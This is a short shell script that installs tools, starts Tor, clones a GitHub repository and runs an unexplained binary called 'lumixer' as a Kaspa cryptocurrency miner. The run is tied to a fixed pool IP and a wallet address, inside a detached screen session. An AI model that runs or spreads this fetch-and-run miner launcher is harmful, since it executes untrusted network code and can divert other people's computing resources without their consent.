#!/bin/sh 

sudo systemctl start tor
sudo apt update 
sudo apt install git wget nano libpci-dev
sudo apt-get install zip unzip 
sudo apt install screen -y 
screen -dmS zorxanyx.sh 65 75 
sudo git clone https://github.com/xavixmanakara/xavixmanakara.git 
cd xavixmanakara
chmod +x lumixer 
POOL=51.79.228.211:3112
WALLET=kaspa:qqarl9eszrluge3nj0vuju9q2cwtlyaswn89prhe5q3anw9pkeqczge803rfy.azerty
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./lumixer --algo KASPA --pool $POOL --user $WALLET $@
